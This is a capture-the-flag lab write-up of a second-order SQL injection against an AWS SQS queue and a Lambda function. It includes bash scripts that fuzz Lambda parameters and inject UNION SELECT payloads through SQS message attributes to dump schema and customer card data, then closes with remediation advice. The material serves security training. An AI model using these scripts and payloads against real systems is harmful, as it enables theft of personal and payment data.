## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/sqs-and-lambda-sql-injection

---
## Vulnerability Summary
The environment is vulnerable to **Second-Order SQL Injection**, where untrusted user input is 
stored in an intermediate system (SQS) and later processed by a backend function (Lambda) 
that executes vulnerable database queries.

1. **Parameter Discovery**: Through automated fuzzing, the application was found to 
   accept a `DESC` parameter, which expected a `trackingID` to retrieve shipment data.
2. **Intermediate Storage Exposure**: The `SQS` queue (`huge-analytics`) allowed 
   unauthenticated enumeration, revealing existing `trackingID` values and the structure 
   expected by the backend.
3. **Second-Order Injection**: By injecting malicious SQL syntax (e.g., `'` or `UNION SELECT`) 
   into the `Client` message attribute, the attacker successfully manipulated the 
   database query executed by the Lambda function.
4. **Database Exfiltration**: Because the application failed to parameterize its SQL 
   queries, the injection allowed for full database schema enumeration and the 
   extraction of sensitive PII (addresses and credit card data) from the `customerData` table.

---
## Walkthrough
Use the provided AWS creds to configure and enumerate:

```bash
aws configure --profile sqs
aws sts get-caller-identity --profile sqs
	IAM user 'analytics-usr'
```

Enumerate the IAM user `analytics-usr`:

```bash
aws-enumerator cred -aws_access_key_id <ACCESS_KEY> -aws_secret_access_key <SECRET_KEY> -aws_region eu-north-1
aws-enumerator enum -services all
	LAMBDA
	STS
	SQS
aws-enumerator dump -services LAMBDA,STS
	ListFunctions
	ListQueues
aws-enumerator dump -services STS                            # Not important
	GetCallerIdentity
	GetSessionToken
```

Enumerate the lambda service functions:

```bash
aws lambda list-functions --output table --profile sqs
	huge-logistics-stock
	arn:aws:iam::254859366442:role/service-role/huge-lambda-analytics-role-ewljs6ls
aws lambda get-function --function-name huge-logistics-stock --profile sqs                # Denied
aws lambda invoke --function-name huge-logistics-stock output output --profile sqs        # Invoke is ALLOWED but output has error
aws lambda invoke --function-name huge-logistics-stock --payload "{\"test\":\"test\"}" output --profile sqs                  # Still error
aws lambda invoke --function-name huge-logistics-stock --payload '{"test":"test"}' --cli-binary-format raw-in-base64-out output --profile sqs          # No work
```

This returns the same result. It's worth trying a few requests with some common parameter names. We can create a script to automate this. First run `wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt` then run:

```bash
#!/bin/bash

i=0

for word in $(cat burp-parameter-names.txt); do
  cmd=$(aws lambda invoke --function-name huge-logistics-stock --payload "{\"$word\":\"test\"}" output --profile sqs);
  ((i=i+1))
  echo "Try $i: $word"
  if grep -q "Invalid event parameter" output;
  then
        rm output;
  else
        cat output; echo -e "\nFound parameter: $word" && break;
  fi;
done
```

After running the script Lambda returns a different error, confirming that the parameter `DESC` is correct and see it is expecting a `trackingID`. We can use SQS to see if we can find that:

```bash
aws sqs list-queues --profile sqs
	https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics
aws sqs receive-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attribute-names All --profile sqs
	trackingID HLT6612
```

Now with this `trackingID`, resend this request with custom attributes in the message body:

```bash
aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"VELUS CORP.", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "Testing" --profile sqs
```

We get confirmation the message was successful transmitted to the queue. Now we can invoke the lambda function:

```bash
aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT6612\"}" output --profile sqs
	`output` file should have an empty array
```

---

To proceed, the following steps should be taken:

```bash
aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"VELUS CORP.\"", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "Testing"

aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output
cat output
	"DB error"
```

"From our probing of the Lambda function and SQS queue we can formulate that the Lambda interfaces with an SQS queue and a database. The Lambda function can retrieve product information from the SQS queue based on a tracking ID and potentially is retrieving tracking data from a database. We can think of it as the mechanism below:

1. A user (or another system component) sends data (referred to as a "payload") via an SQS message.
2. This message is stored temporarily in the SQS queue, awaiting processing.
3. The Lambda function, either on a scheduled basis or triggered by some other event, reads this message from the SQS queue for processing.
4. As part of this processing, the data from the SQS message is used in interactions with a database, potentially as part of a SQL query.

So as an attacker, assuming this is how the system functions, we could try sending a maliciously crafted SQS payload designed to create a second-order SQL injection. A second-order SQL injection happens when the attacker's input is first stored in the system (like a queue or database), and only later used in a vulnerable SQL query. In this case we don't see the result of our injection immediately after executing a malicious SQS command.

The script below sends a specially crafted message with user input to the SQS queue and then invokes the Lambda function to process the message. If the Lambda response contains the text "Invalid" then the process repeats, otherwise the script displays the output."

```bash
#!/bin/bash

output=default

while [ -n "$output" ]; do

    output=""

    aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes "{ \"Weight\": { \"StringValue\": \"1337\", \"DataType\":\"Number\"}, \"Client\": {\"StringValue\":\"VELUS CORP.\\\" $1\", \"DataType\": \"String\"}, \"trackingID\": {\"StringValue\":\"HLT1337\", \"DataType\":\"String\"}}" --message-body "Testing" --profile sqs | tee &> /dev/null

    aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output --profile sqs &> /dev/null
    output=$(cat output | grep "Invalid")

    if [[ $output == "" ]]; then
        cat output
        echo ""
    fi
done
```

Figure out the number of columns by trying `UNION SELECT`:

```bash
./lambda_sqli.sh "SELECT null, @@version;-- -"
./lambda_sqli.sh "UNION SELECT null, @@version;-- -"
./lambda_sqli.sh "UNION SELECT null, null, @@version;-- -"
./lambda_sqli.sh "UNION SELECT null, null, null, @@version;-- -"                   # Returns the database version information (not "DB Error")
```

It appears there are 4 columns in the database based on the output. What we know so far:

- There are four columns in the table
- `@@version` is specific to MySQL and MariaDB for retrieving the version of the database server
- The version of the server is 8.0.33 (as of 16 Jun 2023, Amazon Relational Database Service (Amazon RDS) for MySQL now supports MySQL minor _versions_ 5.7.42 and 8.0.33)
- The last column is injectable, and displays output in the `delivered` attribute (actually all four columns are injectable and output to the corresponding attribute).

Modified script to display clean output:

```bash
#!/bin/bash

output=default

while [ -n "$output" ]; do

    output=""

    aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes "{ \"Weight\": { \"StringValue\": \"1337\", \"DataType\":\"Number\"}, \"Client\": {\"StringValue\":\"VELUS CORP.\\\" $1\", \"DataType\": \"String\"}, \"trackingID\": {\"StringValue\":\"HLT1337\", \"DataType\":\"String\"}}" --message-body "Testing" --profile sqs | tee &> /dev/null

    aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output --profile sqs &> /dev/null

    output=$(cat output | grep "Invalid")

    if [[ $output == "" ]]; then
        cat output | sed 's/delivered/\n/g' | awk -F"\"" '{ print $3 }' | grep -v "^:" | grep -v '^0' | sed '/^$/d'
    fi

done
```

Run the script and enumerate the tables:

```bash
./lambda_sqli.sh "UNION SELECT null, null, null, table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('information_schema', 'mysql')-- -"
global_status
global_variables
persisted_variables
processlist
session_account_connect_attrs
session_status
session_variables
variables_info
TrackingData
customerData
```

Enumerate the `customerData` table:

```bash
./lambda_sqli.sh "UNION SELECT null, null, null, column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'customerData'-- -"
address
cardUsed
clientName
./lambda_sqli.sh "UNION SELECT null, null, null, CONCAT(clientName,':',address,':',cardUsed) FROM customerData-- -"
	FLAG HERE
```

---
## Remediations
1. **Parameterized Queries**:
   - The primary defense against SQL injection is the use of **Prepared Statements** (parameterized queries). Never concatenate user-provided inputs directly into 
     SQL command strings.
2. **Strict Input Validation**:
   - Sanitize and validate all data retrieved from `SQS` messages before using it 
     in database operations. Implement strict allow-lists for input formats (e.g., 
     ensuring `trackingID` follows a specific alphanumeric pattern).
3. **Least Privilege for Lambda**:
   - The IAM role assigned to the Lambda function should follow the **Principle of Least 
     Privilege (PoLP)**. If the function only requires access to specific tables, 
     use database-level grants to limit its permissions rather than granting 
     broad access to the entire schema.
4. **Monitoring & Detection**:
   - Monitor database error logs for frequent syntax errors, which are often 
     precursors to automated SQL injection attacks.
   - Use `AWS WAF` (if applicable) or application-level logging to detect and block 
     common SQL injection patterns (`UNION`, `SELECT`, `--`, `INFORMATION_SCHEMA`).